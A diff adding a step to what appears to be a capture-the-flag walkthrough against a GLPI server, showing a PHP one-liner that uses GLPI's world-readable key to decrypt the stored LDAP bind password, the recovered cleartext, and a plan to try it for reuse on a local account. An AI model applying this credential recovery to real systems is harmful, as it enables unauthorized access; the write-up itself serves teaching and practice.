@@ -909,7 +909,38 @@ rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpm
 <br>
 </div>
 
+#### 4.5 Decrypt the LDAP bind password
 
+**Why this step:** The `rootdn_passwd` blob is reversibly encrypted with the world-readable `glpicrypt.key`. Decrypt it using GLPI’s own key-handling code.
+
+**Command:**
+
+```shell
+cd /opt/glpi
+php -r '
+define("GLPI_CONFIG_DIR", "/opt/glpi/config");
+require "vendor/autoload.php";
+require "src/GLPIKey.php";
+$key = new GLPIKey();
+echo $key->decrypt("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==") . PHP_EOL;
+'
+```
+
+**Breakdown:**
+
+- `define("GLPI_CONFIG_DIR", ...)` points GLPI at its config directory (where `glpicrypt.key` lives).
+- `require` loads GLPI’s Composer autoloader and the `GLPIKey` class.
+- `$key->decrypt(...)` reverses the XChaCha20-Poly1305 encryption using the on-disk key.
+
+**Result:**
+
+```
+WpczC40GhTbk
+```
+
+**What this gives you:** The cleartext bind password for `svc-glpi`. **Key finding:** the LDAP bind password is `WpczC40GhTbk`, recovered by abusing GLPI’s own decryption routine against its world-readable key.
+
+**Next:** Test this password for reuse against the local user `owen`.
 <div align="center">
 <br>
 <br>
